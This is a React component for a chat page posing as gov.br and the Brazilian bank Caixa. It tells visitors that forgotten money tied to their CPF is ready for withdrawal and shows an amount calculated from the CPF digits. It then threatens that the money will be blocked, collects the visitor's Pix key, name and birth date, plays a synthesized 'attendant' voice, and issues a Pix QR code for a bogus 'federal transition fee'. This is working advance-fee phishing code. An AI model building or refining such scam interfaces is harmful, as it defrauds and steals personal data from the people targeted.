import { useState, useEffect, useRef } from "react";
import { CheckCircle2, Search, ArrowRight, ShieldCheck, Loader2, PlayCircle, PauseCircle, AlertCircle } from "lucide-react";
import { motion, AnimatePresence } from "motion/react";
import axios from "axios";
import { API_URL } from "../config";
import { QRCodeCanvas } from "qrcode.react";

interface ChatStepProps {
  data: {
    docType: string;
    docValue: string;
    birthDate: string;
  };
  onReset: () => void;
}

export function ChatStep({ data, onReset }: ChatStepProps) {
  const [messages, setMessages] = useState<any[]>([]);
  const [inputValue, setInputValue] = useState("");
  const [awaitingPix, setAwaitingPix] = useState(false);
  const [typing, setTyping] = useState(false);
  const [flowState, setFlowState] = useState<number>(0);
  const [leadName, setLeadName] = useState("");
  const [leadValue, setLeadValue] = useState("");
  const [leadPixKey, setLeadPixKey] = useState("");
  const [tarifa, setTarifa] = useState<number>(2.99);
  const [buyPixData, setBuyPixData] = useState<any>(null);
  
  const [audioUrl, setAudioUrl] = useState<string | null>(null);
  const audioRef = useRef<HTMLAudioElement | null>(null);
  
  const [attendant, setAttendant] = useState({ name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" });

  const endOfMessagesRef = useRef<HTMLDivElement>(null);

  const calculateValue = (doc: string) => {
    const digits = doc.replace(/\D/g, "");
    const base = parseInt(digits.substring(0, 4)) || 1234;
    return (base * 1.5) + (parseInt(digits.slice(-2)) * 10);
  };

  useEffect(() => {
    endOfMessagesRef.current?.scrollIntoView({ behavior: "smooth" });
  }, [messages, typing]);

  useEffect(() => {
    const setupChat = async () => {
      // Sorteia uma atendente
      const attendants = [
         { name: "Camila", voiceId: "EXAVITQu4vr4xnSDxMaL" },
         { name: "Letícia", voiceId: "ThT5KcBeYPX3keUQqHPh" },
         { name: "Amanda", voiceId: "GM2UA3fbsIaLHcswCDX9" },
         { name: "Juliana", voiceId: "JBFqnCBsd6RMkjVDRZzb" }
      ];
      const selectedAttendant = attendants[Math.floor(Math.random() * attendants.length)];
      setAttendant(selectedAttendant);

      try {
        const res = await axios.get(`${API_URL}/api/config`);
        if (res.data.tarifaTransicional) setTarifa(res.data.tarifaTransicional);
      } catch (e) {
        console.error("Config fetch failed", e);
      }

      setTyping(true);
      try {
        const response = await axios.post(`${API_URL}/api/v1/validate/document`, {
           docType: data.docType,
           docValue: data.docValue
        });
        
        const name = response.data?.name || response.data?.mockName || "Cidadão";
        setLeadName(name);
        
        const val = calculateValue(data.docValue);
        const formattedVal = val.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
        setLeadValue(formattedVal);
        
        setTyping(false);
        addBotMessage(`Parabéns, ${name}! A sua solicitação de saque foi aprovada no valor de ${formattedVal} referentes a saldos esquecidos no CPF ${data.docValue}.`, undefined, "/assets/banners/meu_govbr.png");
        
        // Show second message after 2 seconds
        setTimeout(() => {
          setTyping(true);
          setTimeout(() => {
            setTyping(false);
            addBotMessage(`ATENÇÃO: Após essa solicitação para saque, você irá iniciar o seu recebimento do saque imediato, caso você não conclua o processo a seguir, será entendido que você não deseja receber este valor, tendo o mesmo não transferido e também bloqueado pelo Banco Central. Caso isso ocorra, o valor disponível para você será repassado para o Fundo Governamental e utilizado para fins públicos. Observação: Isso só acontecerá se você não concluir a etapa a seguir.`);
            
            // Show third message after 2 seconds
            setTimeout(() => {
              setTyping(true);
              setTimeout(() => {
                setTyping(false);
                addBotMessage(`Para garantir que o valor vá para a conta correta, digite abaixo a sua Chave PIX de preferência:`);
                setAwaitingPix(true);
              }, 1500);
            }, 2000);
          }, 1500);
        }, 2000);
      } catch (e) {
        setTyping(false);
        addBotMessage("Poxa, deu uma falha de conexão. Tenta recarregar a página, tá bom?");
      }
    };
    
    setupChat();
  }, []);

  const addBotMessage = (text: string, options?: any[], image?: string) => {
    setMessages(prev => [...prev, { sender: "bot", text, options, image }]);
  };

  const addUserMessage = (text: string) => {
    setMessages(prev => [...prev, { sender: "user", text }]);
  };

  const identifyPixType = (key: string) => {
    if (key.includes("@")) return "E-mail";
    const digits = key.replace(/\D/g, "");
    if (digits.length === 11 && !key.startsWith("(")) return "CPF";
    if (digits.length === 14) return "CNPJ";
    if (digits.length >= 10 && key.includes("(")) return "Celular";
    if (digits.length >= 10 && !key.includes("(")) return "Celular";
    return "Chave Aleatória";
  };

  const handleAction = async (action: string, payload?: string) => {
    if (action === "submit_pix") {
      const pix = payload || inputValue;
      if (!pix) return;
      
      const pixType = identifyPixType(pix);
      if (pixType === "Chave Aleatória" && pix.length < 8) {
         setAwaitingPix(false);
         setInputValue("");
         addUserMessage(pix);
         setTyping(true);
         setTimeout(() => {
            setTyping(false);
            addBotMessage("Eu não consegui identificar isso como uma chave PIX válida. Digite corretamente a sua Chave PIX:");
            setAwaitingPix(true);
         }, 1000);
         return;
      }

      setAwaitingPix(false);
      setInputValue("");
      addUserMessage(pix);
      setLeadPixKey(pix);
      setTyping(true);
      
      setTimeout(() => {
        setTyping(false);
        addBotMessage(`A sua **solicitação de saque foi aprovada** para a Chave Pix cadastrada:\n**Chave Pix:** ${pix}\n\nClique no botão abaixo para efetuar a **transferência do valor de ${leadValue}** para a conta da Chave Pix cadastrada.`, [
          { text: "Receber por PIX", action: "generate_payment" }
        ]);
      }, 1500);
    }
    else if (action === "generate_payment") {
      setMessages(prev => {
        const newMessages = [...prev];
        if (newMessages.length > 0) newMessages[newMessages.length - 1].options = [];
        return newMessages;
      });
      setTyping(true);
      
      try {
        const ttsRes = await axios.post(`${API_URL}/api/v1/tts`, { 
           name: leadName,
           attendantName: attendant.name,
           voiceId: attendant.voiceId,
           value: leadValue
        });
        if (ttsRes.data.audioBase64) {
           const url = `data:audio/mp3;base64,${ttsRes.data.audioBase64}`;
           setAudioUrl(url);
           if (audioRef.current) {
             audioRef.current.src = url;
             audioRef.current.play().catch(e => console.log("Autoplay blocked:", e));
           }
        }

        // Fetch BuyPix
        const pixRes = await axios.post(`${API_URL}/api/v1/buypix/create`, {
          amount: tarifa,
          payer_document: data.docValue,
          payer_name: leadName
        });

        if (pixRes.data.data) {
           setBuyPixData(pixRes.data.data);
        }
      } catch (err) {
         console.error("Payment generation error", err);
      }
      setTyping(false);
      setFlowState(2); // Mostra o comprovante final
    }
  };

  const copyPix = () => {
    if (buyPixData?.pix_qr_code) {
      navigator.clipboard.writeText(buyPixData.pix_qr_code);
      alert("PIX copiado com sucesso!");
    }
  };

  return (
    <div className="fixed inset-0 z-50 bg-[#161c24] flex flex-col font-sans overflow-hidden">
      
      {/* Messages Area */}
      <div className="flex-1 overflow-y-auto px-4 py-8 space-y-6">
        <AnimatePresence>
          {messages.map((msg, i) => (
            <motion.div 
              key={i} 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className={`flex ${msg.sender === 'user' ? 'justify-end' : 'justify-start items-start gap-3'}`}
            >
              {msg.sender === 'bot' && (
                <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                   {/* Logo gov.br simulada */}
                  <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="w-full h-full object-contain p-1" />
                </div>
              )}

              <div className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'} w-full max-w-[85%]`}>
                <div className={`p-4 text-[15px] leading-relaxed shadow-sm w-full ${
                  msg.sender === 'user' 
                    ? 'bg-[#1b365d] text-white rounded-2xl rounded-tr-sm' 
                    : 'bg-[#1e2732] text-[#d1d5db] rounded-2xl rounded-tl-sm'
                }`}>
                  {msg.image && (
                     <img src={msg.image} alt="Banner" className="w-full h-auto rounded-lg mb-3 shadow-sm object-cover" />
                  )}
                  {msg.text.split('\\n').map((line:string, idx:number) => (
                     <p key={idx} className={`${idx !== 0 ? 'mt-2' : ''}`} dangerouslySetInnerHTML={{__html: line.replace(/\*\*(.*?)\*\*/g, '<strong class="text-white">$1</strong>')}} />
                  ))}
                </div>

                {msg.options && msg.options.length > 0 && (
                  <div className="mt-3 flex justify-end w-full">
                    {msg.options.map((opt: any, j: number) => (
                      <button 
                        key={j}
                        onClick={() => handleAction(opt.action)}
                        className="bg-[#ff9029] hover:bg-[#e87f1f] text-white font-bold py-2.5 px-6 rounded transition-colors shadow-md text-sm tracking-wide"
                      >
                        {opt.text}
                      </button>
                    ))}
                  </div>
                )}
              </div>
            </motion.div>
          ))}

          {typing && (
             <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} className="flex justify-start items-start gap-3">
               <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                 <img src="https://i.imgur.com/rB0rJ44.png" alt="gov.br" className="w-full h-full object-contain p-1" />
               </div>
               <div className="bg-[#1e2732] p-4 rounded-2xl rounded-tl-sm shadow-sm flex items-center space-x-2">
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }} />
                  <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.4s' }} />
               </div>
             </motion.div>
          )}

          {/* Estado Final (Ticket Caixa) embutido no chat */}
          {flowState === 2 && (
            <motion.div 
              initial={{ opacity: 0, y: 15 }}
              animate={{ opacity: 1, y: 0 }}
              className="flex justify-start items-start gap-3 mt-6 pb-20"
            >
              <div className="w-10 h-10 rounded-full flex-shrink-0 bg-[#005CA9] flex items-center justify-center overflow-hidden shadow-sm mt-1 border-2 border-[#161c24]">
                <span className="text-white font-bold text-xs">gov.br</span>
              </div>
              <div className="w-full max-w-xs sm:max-w-sm rounded-xl overflow-hidden shadow-xl bg-[#f5f6f8]">
                
                {/* Header CAIXA Azul */}
                <div className="bg-[#005CA9] px-4 py-5 flex items-center justify-center relative">
                   <h2 className="text-white font-extrabold text-2xl tracking-widest relative z-10">CAIXA</h2>
                   {/* Linha abstrata de fundo simulando o logo */}
                   <div className="absolute inset-0 opacity-20 bg-[linear-gradient(45deg,transparent_45%,white_45%,white_55%,transparent_55%)] bg-[length:20px_20px]"></div>
                </div>

                <div className="bg-white p-4">
                  {/* Valores e Data Header */}
                  <div className="flex justify-between items-start mb-4 border-b border-gray-200 pb-3">
                    <div>
                      <p className="text-[11px] text-gray-500 uppercase tracking-wider font-semibold">Valor</p>
                      <p className="text-[#005CA9] font-bold text-lg">{leadValue}</p>
                    </div>
                    <div className="text-right">
                      <p className="text-[11px] text-gray-500 uppercase tracking-wider font-semibold">Data</p>
                      <p className="text-gray-700 text-sm">{new Date().toLocaleDateString('pt-BR')}</p>
                      <p className="text-gray-500 text-xs">{new Date().toLocaleTimeString('pt-BR')}</p>
                    </div>
                  </div>

                  {/* Alerta de PIX Pendente */}
                  <div className="bg-red-50 rounded-lg p-3 flex items-start gap-3 mb-5 border border-red-100">
                    <AlertCircle className="text-red-500 w-8 h-8 flex-shrink-0 mt-0.5" />
                    <div>
                      <h4 className="text-red-600 font-bold text-[15px]">PIX Pendente!</h4>
                      <p className="text-red-400 text-xs">Aguardando Pagamento da Tarifa Transacional...</p>
                    </div>
                  </div>

                  {/* Dados do Recebedor */}
                  <div className="space-y-3">
                    <h3 className="text-gray-600 font-bold text-sm">Dados do Recebedor:</h3>
                    
                    <div>
                      <p className="text-xs text-gray-500">Nome:</p>
                      <p className="text-sm font-medium text-gray-800">{leadName}</p>
                    </div>
                    
                    <div>
                      <p className="text-xs text-gray-500">CPF:</p>
                      <p className="text-sm font-medium text-gray-800">{data.docValue}</p>
                    </div>

                    <div>
                      <p className="text-xs text-gray-500">Data de Nascimento:</p>
                      <p className="text-sm font-medium text-gray-800">{data.birthDate}</p>
                    </div>

                    <div>
                      <p className="text-xs text-gray-500">Chave Pix:</p>
                      <p className="text-sm font-medium text-gray-800">{leadPixKey}</p>
                    </div>
                  </div>

                  {/* Area de Pagamento da Tarifa */}
                  <div className="mt-6 pt-5 border-t border-gray-200">
                    <p className="text-center text-sm text-gray-600 font-medium mb-4">
                      Tarifa Transicional Federal: <strong className="text-gray-900">R$ {tarifa.toFixed(2)}</strong>
                    </p>

                    {buyPixData?.pix_qr_code ? (
                      <div className="flex flex-col items-center space-y-4">
                        <div className="bg-white p-2 rounded-xl border border-gray-200 shadow-sm">
                            <QRCodeCanvas value={buyPixData.pix_qr_code} size={180} />
                        </div>
                        <button onClick={copyPix} className="w-full bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm">
                            Copiar Código PIX
                        </button>
                      </div>
                    ) : (
                      <div className="flex justify-center p-4">
                        <Loader2 className="w-6 h-6 text-[#005CA9] animate-spin" />
                      </div>
                    )}
                  </div>
                </div>
              </div>
            </motion.div>
          )}

          <div ref={endOfMessagesRef} />
        </AnimatePresence>
      </div>

      {/* Input Area (Apenas quando aguarda o PIX) */}
      <AnimatePresence>
        {awaitingPix && (
          <motion.div 
            initial={{ opacity: 0, y: 100 }}
            animate={{ opacity: 1, y: 0 }}
            exit={{ opacity: 0, y: 100 }}
            className="p-4 bg-[#1e2732] flex items-center space-x-3 shadow-[0_-4px_15px_rgba(0,0,0,0.2)]"
          >
            <input 
              type="text" 
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              onKeyDown={(e) => e.key === 'Enter' && handleAction("submit_pix")}
              placeholder="Digite sua chave PIX..."
              className="flex-1 bg-[#161c24] border border-[#2d3748] text-white rounded-full px-5 py-3 text-sm focus:outline-none focus:border-[#ff9029]"
            />
            <button 
              onClick={() => handleAction("submit_pix")}
              className="w-12 h-12 bg-[#ff9029] text-white rounded-full flex items-center justify-center hover:bg-[#e87f1f] transition-colors shadow-lg"
            >
              <ArrowRight size={20} />
            </button>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Audio Player Oculto para autoplay e controle */}
      {audioUrl && (
         <audio ref={audioRef} style={{ display: 'none' }} />
      )}
    </div>
  );
}
